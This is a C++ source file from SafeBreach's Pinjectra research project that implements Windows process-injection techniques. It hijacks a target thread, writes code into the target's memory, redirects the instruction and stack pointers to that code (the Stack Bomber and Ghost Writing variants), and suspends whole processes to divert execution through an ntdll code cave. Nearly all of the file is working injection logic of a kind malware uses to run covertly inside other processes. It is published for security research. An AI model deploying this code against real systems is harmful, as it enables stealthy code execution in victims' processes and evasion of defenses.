// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

// Standard Include's
#include <iostream>
#include <map>
#include <string>

// Local Include's
#include "SIR.h"
#include "DynamicPayloads.h"

extern "C" {
	#include "misc.h"
}

////////////////////
// Thread Classes //
////////////////////

CodeViaThreadSuspendInjectAndResume::~CodeViaThreadSuspendInjectAndResume()
{
}

boolean CodeViaThreadSuspendInjectAndResume::inject(DWORD pid, DWORD tid)
{
	CONTEXT old_ctx, new_ctx;
	RUNTIME_MEM_ENTRY* result;
	HANDLE tp;
	DWORD process_id;

	tp = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid); // THREAD_QUERY_INFORMATION  is needed for GetProcessIdOfThread

	process_id = GetProcessIdOfThread(tp);

	if (process_id == 0)
	{
		std::cerr << "GetProcessIdOfThread Failed with " << GetLastError() << std::endl;
		return false;
	}

	result = this->m_memwriter->write(process_id, tid);

	if (result == NULL) {
		std::cerr << "Write Failed with" << GetLastError() << std::endl;
		return false;
	}

	HANDLE thread_handle = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
	if (thread_handle == NULL)
	{
		std::cerr << "OpenThread Failed with " << GetLastError() << std::endl;
		return false;
	}

	SuspendThread(thread_handle);
	old_ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(thread_handle, &old_ctx))
	{
		std::cerr << "GetThreadContext Failed with " << GetLastError() << std::endl;
		return false;
	}

	new_ctx = old_ctx;
	new_ctx.Rip = (DWORD64)result->addr;

	if (!SetThreadContext(thread_handle, &new_ctx))
	{
		std::cerr << "SetThreadContext Failed with " << GetLastError() << std::endl;
		return false;
	}

	ResumeThread(thread_handle);
	Sleep(10000);
	SuspendThread(thread_handle);
	SetThreadContext(thread_handle, &old_ctx);
	ResumeThread(thread_handle);

	return true;
}

//////////////////////
// Complex Variants //
//////////////////////

// Used for Stack Bomber
CodeViaThreadSuspendInjectAndResume_Complex::~CodeViaThreadSuspendInjectAndResume_Complex()
{
}

boolean CodeViaThreadSuspendInjectAndResume_Complex::inject(DWORD pid, DWORD tid)
{
	TARGET_PROCESS target;
	TStrDWORD64Map runtime_parameters;
	HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
	SuspendThread(t);
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(t, &context))
	{
		printf("GetThreadContext failed with error 0x%08x\n", GetLastError());
		return 0;
	}
	//printf("Thread's RSP=0x%016llx\n   Rip=0x%016llx", context.Rsp, context.Rip);
	runtime_parameters["orig_tos"] = (DWORD64)context.Rsp;
	runtime_parameters["tos"] = runtime_parameters["orig_tos"] - 0x2000;

	// Setup Target
	target.thread = t;
	target.tid = tid;

	this->m_memwriter->eval_and_write(&target, runtime_parameters);

	ResumeThread(t);
}

// Used for Ghost Writing
CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex::~CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex()
{
}

boolean CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex::inject(DWORD pid, DWORD tid)
{
	PINJECTRA_PACKET* output;
	TARGET_PROCESS target;
	TStrDWORD64Map runtime_parameters;
	HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);

	// Save target thread original state
	SuspendThread(t);
	CONTEXT old_ctx;
	old_ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(t, &old_ctx))
	{
		printf("OOPS - GTC failed with 0x%08x\n", GetLastError());
		exit(0);
	}

	//printf("Thread's RSP=0x%016llx\n   Rip=0x%016llx", context.Rsp, context.Rip);
	runtime_parameters["OLD_CTX"] = (DWORD64)& old_ctx;
	runtime_parameters["OLD_CTX_RSP"] = old_ctx.Rsp;

	// Setup Target
	target.thread = t;
	target.tid = tid;

	output = this->m_memwriter->eval_and_write(&target, runtime_parameters);

	TStrDWORD64Map& tMetadata = *output->metadata;

	old_ctx.Rsp = tMetadata["NEW_STACK_POS"];
	old_ctx.Rip = tMetadata["GADGET_popregs"];
	SetThreadContext(t, &old_ctx);
	ResumeThread(t);
	_wait_until_done(t, tMetadata["GADGET_loop"]);

	// Resume original flow in target thread
	SuspendThread(t);
	SetThreadContext(t, &old_ctx);
	ResumeThread(t);
}

/////////////////////
// Process Classes //
/////////////////////

CodeViaProcessSuspendInjectAndResume_Complex::~CodeViaProcessSuspendInjectAndResume_Complex()
{
}

#define TARGET "ntdll"
#define TARGET_FUNCTION GetProcAddress(GetModuleHandleA("ntdll"),"NtClose")
#define TARGET_CAVE GetProcAddress(GetModuleHandleA("ntdll"),"atan")

boolean CodeViaProcessSuspendInjectAndResume_Complex::inject(DWORD pid, DWORD tid)
{
	PINJECTRA_PACKET* output;
	TARGET_PROCESS target;
	TStrDWORD64Map runtime_parameters;

	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_SUSPEND_RESUME, FALSE, pid);

	if (hProcess == NULL) {
		printf("OpenProcess: %x\n", GetLastError());
	}

	typedef LONG(NTAPI * NtSuspendProcess)(IN HANDLE ProcessHandle);
	typedef LONG(NTAPI * NtResumeProcess)(IN HANDLE ProcessHandle);

	NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess");
	NtResumeProcess pfnNtResumeProcess = (NtResumeProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtResumeProcess");

	NTSTATUS x = (*pfnNtSuspendProcess)(hProcess);
	if (x != 0)
	{
		printf("NtSuspendProcess returned 0x%08x\n", x);
	}

	// Update Inject-specific Parameters
	runtime_parameters["TARGET"] = (DWORD64)_strdup(TARGET);
	runtime_parameters["TARGET_CAVE"] = (DWORD64)TARGET_CAVE;
	runtime_parameters["TARGET_FUNCTION"] = (DWORD64)TARGET_FUNCTION;

	// Setup Target
	target.process = hProcess;
	target.pid = pid;

	// Eval & Write
	this->m_memwriter->eval_and_write(&target, runtime_parameters);

	(*pfnNtResumeProcess)(hProcess);

	return 1;
}
